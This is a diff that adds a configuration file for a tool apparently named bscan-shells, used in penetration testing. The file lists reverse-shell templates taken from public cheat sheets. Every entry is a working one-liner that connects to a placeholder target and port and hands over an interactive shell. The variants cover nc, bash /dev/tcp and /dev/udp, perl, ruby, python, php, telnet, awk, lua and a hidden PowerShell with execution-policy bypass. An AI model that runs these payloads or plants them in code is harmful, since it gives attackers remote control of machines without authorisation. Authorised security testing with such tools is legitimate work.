@@ -1,0 +1,75 @@
+# definitions of reverse shells to be generated via the `bscan-shells` tool
+#
+# custom templates must include `<target>` and `<port>` entries
+#
+# entries in this file mainly derived from:
+# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+[[shells]]
+  name = 'nc with -e'
+  cmd = 'nc <target> <port> -e /bin/bash'
+
+[[shells]]
+  name = 'nc without -e'
+  cmd = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <target> <port> >/tmp/f'
+
+[[shells]]
+  name = 'bash tcp'
+  cmd = 'bash -i >& /dev/tcp/<target>/<port> 0>&1'
+
+[[shells]]
+  name = 'bash udp'
+  cmd = 'bash -i >& /dev/udp/<target>/<port> 0>&1'
+
+[[shells]]
+  name = 'perl with /bin/sh'
+  cmd = "perl -e 'use Socket;$i=\"<target>\";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+
+[[shells]]
+  name = 'perl without /bin/sh'
+  cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"<target>:<port>\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+
+[[shells]]
+  name = 'perl for windows'
+  cmd = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"<target>:<port>\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+
+[[shells]]
+  name = 'ruby with /bin/sh'
+  cmd = "ruby -rsocket -e'f=TCPSocket.open(\"<target>\",<port>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+
+[[shells]]
+  name = 'ruby without /bin/sh'
+  cmd = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"<target>\",\"<port>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+
+[[shells]]
+  name = 'ruby for windows'
+  cmd = "ruby -rsocket -e 'c=TCPSocket.new(\"<target>\",\"<port>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+
+[[shells]]
+  name = 'python with /bin/sh'
+  cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<target>\",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+[[shells]]
+  name = 'php with /bin/sh'
+  cmd = "php -r '$sock=fsockopen(\"<target>\",<port>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+
+[[shells]]
+  name = 'telnet'
+  cmd = 'rm -f /tmp/p; mknod /tmp/p p && telnet <target> <port> 0/tmp/p'
+
+[[shells]]
+  name = 'awk'
+  cmd = "awk 'BEGIN {s = \"/inet/tcp/0/<target>/<port>\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+
+[[shells]]
+  name = 'powershell'
+  cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<target>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+[[shells]]
+  name = 'lua with /bin/sh'
+  cmd = "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('<target>','<port>');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
+
+[[shells]]
+  name = 'lua without /bin/sh (works on windows)'
+  cmd = "lua -e 'local host, port = \"<target>\", <port> local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
